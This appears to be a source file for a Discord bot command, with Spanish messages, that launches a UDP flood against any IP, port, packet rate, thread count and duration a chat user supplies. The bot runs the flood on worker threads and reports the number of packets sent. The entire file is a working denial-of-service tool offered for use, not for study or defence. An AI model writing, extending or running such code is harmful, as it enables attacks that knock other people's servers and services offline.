const { EmbedBuilder } = require('discord.js');
const dgram = require('dgram');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

let workers = [];
let attackInProgress = false;
let stoppedAttacks = 0;

module.exports = {
    name: 'udp',
    description: 'Inicia o detiene un ataque UDP',
    execute(message, args) {
        if (args[0] === 'stop') {
            if (attackInProgress) {
                workers.forEach(worker => worker.terminate());
                workers = [];
                attackInProgress = false;
                stoppedAttacks++;

                const stopEmbed = new EmbedBuilder()
                    .setColor('#FF0000')
                    .setDescription(`🛑 **Ataque detenido correctamente** 🚫\nAtaques detenidos: ${stoppedAttacks}`)
                    .setTimestamp();
                return message.channel.send({ embeds: [stopEmbed] });
            } else {
                const noAttackEmbed = new EmbedBuilder()
                    .setColor('#FF0000')
                    .setDescription('❌ No hay ningún ataque en curso.')
                    .setTimestamp();
                return message.channel.send({ embeds: [noAttackEmbed] });
            }
        }

        if (args.length !== 5) {
            const usageEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('🚀 Para atacar use: .udp <IP> <Port> <PPS> <Threads> <Time>\nejemplo: .udp 192.168.0.1 80 50 10 60 🚀')
                .setTimestamp();
            return message.channel.send({ embeds: [usageEmbed] });
        }

        const [ip, port, pps, threads, time] = args;

        if (!isValidIP(ip)) {
            const invalidIpEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('❌ IP no válida.')
                .setTimestamp();
            return message.channel.send({ embeds: [invalidIpEmbed] });
        }

        const embed = new EmbedBuilder()
            .setColor(getRandomColor())
            .setTitle('🚀 Iniciando ataque UDP 🚀')
            .setDescription(`**Método:** .udp\n\n**IP:** ${ip}\n**Port:** ${port}\n**PPS:** ${pps}\n**Threads:** ${threads}\n**Time:** ${time}`)
            .setTimestamp();

        message.channel.send({ embeds: [embed] });

        attackInProgress = true;
        let workersCompleted = 0;
        let totalPacketsSent = 0;

        for (let i = 0; i < threads; i++) {
            const worker = new Worker(__filename, {
                workerData: { ip, port, pps, time }
            });

            workers.push(worker);

            worker.on('message', (msg) => {
                if (msg.packetsSent) {
                    totalPacketsSent += msg.packetsSent;
                }

                workersCompleted++;
                if (workersCompleted === threads) {
                    attackInProgress = false;
                    const finalEmbed = new EmbedBuilder()
                        .setColor(getRandomColor())
                        .setDescription(`✅ **Ataque finalizado**. Paquetes enviados: ${totalPacketsSent} 🚀`)
                        .setTimestamp();
                    message.channel.send({ embeds: [finalEmbed] });
                }
            });

            worker.on('error', (err) => {
                const errorEmbed = new EmbedBuilder()
                    .setColor('#FF0000')
                    .setDescription(`❌ Error en el worker: ${err.message}`)
                    .setTimestamp();
                message.channel.send({ embeds: [errorEmbed] });
            });
        }
    }
};

function isValidIP(ip) {
    const regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    return regex.test(ip);
}

function getRandomColor() {
    const colors = ['#FF5733', '#33FF57', '#3357FF', '#FF33A1', '#A133FF'];
    return colors[Math.floor(Math.random() * colors.length)];
}

if (!isMainThread) {
    const { ip, port, pps, time } = workerData;
    const udpClient = dgram.createSocket('udp4');
    const packet = Buffer.from('UDP Packet');
    let packetsSent = 0;

    udpClient.on('error', (err) => {
        console.error(`Error: ${err.message}`);
        parentPort.postMessage({ error: err.message });
        udpClient.close();
    });

    udpClient.on('close', () => {
        parentPort.postMessage({ error: 'El servidor está offline o no se puede alcanzar.' });
    });

    const interval = setInterval(() => {
        for (let i = 0; i < pps; i++) {
            udpClient.send(packet, port, ip, (err) => {
                if (err) {
                    console.error(err);
                } else {
                    packetsSent++;
                }
            });
        }
    }, 1000 / pps);

    setTimeout(() => {
        clearInterval(interval);
        udpClient.close();
        parentPort.postMessage({ packetsSent });
    }, time * 1000);
}
